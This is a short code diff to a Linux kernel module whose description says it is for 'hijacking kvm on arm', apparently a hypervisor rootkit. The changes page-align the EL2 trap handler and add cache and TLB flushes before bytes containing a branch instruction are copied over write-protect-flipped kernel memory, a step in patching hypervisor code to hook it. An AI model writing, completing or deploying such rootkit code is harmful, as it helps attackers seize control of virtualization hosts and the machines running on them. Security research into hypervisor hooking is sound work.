@@ -28,7 +28,7 @@ MODULE_DESCRIPTION("hijacking kvm on arm");
 MODULE_VERSION("0.01");
 
 
-void kvmrk_handle_trap(struct kvm_cpu_context *host_ctxt) {
+__attribute__((optimize("align-functions=4096"))) void kvmrk_handle_trap(struct kvm_cpu_context *host_ctxt) {
     u64 esr = read_sysreg_el2(SYS_ESR);
 
     switch (ESR_ELx_EC(esr)) {
@@ -89,6 +89,9 @@ static int __init kvmrk_init(void) {
     to_copy[4] = cpu_to_le32(0xd61f0260);
 
     pte_flip_write_protect(virt_to_pte(copy_here_start));
+    flush_cache_mm(init_mm_ptr);
+    flush_tlb_all();
+    kvmrk_flush_virt(virt_to_pte(copy_here_start));
     memcpy(copy_here_start, to_copy, 5);
 
     flush_cache_mm(init_mm_ptr);
